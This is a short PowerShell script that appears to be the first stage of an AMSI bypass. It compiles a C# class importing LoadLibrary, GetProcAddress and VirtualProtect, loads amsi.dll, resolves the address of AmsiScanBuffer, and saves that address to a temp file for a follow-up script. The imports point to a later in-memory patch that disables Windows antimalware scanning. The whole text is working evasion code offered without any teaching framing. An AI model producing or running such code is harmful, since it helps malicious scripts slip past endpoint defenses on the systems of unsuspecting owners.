# Load Required Assemblies
$ObfA = @"
using System;
using System.Runtime.InteropServices;
public class AMSIB {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ObfA

# Load AMSI DLL
$Lib = [AMSIB]::LoadLibrary("amsi.dll")
$FuncAddr = [AMSIB]::GetProcAddress($Lib, "AmsiScanBuffer")

# Save Address for Use in Next Script
$FuncAddr | Out-File -FilePath "$env:TEMP\amsi_func.txt" -Encoding ASCII

Write-Host "[*] AMSI DLL loaded, function address saved."
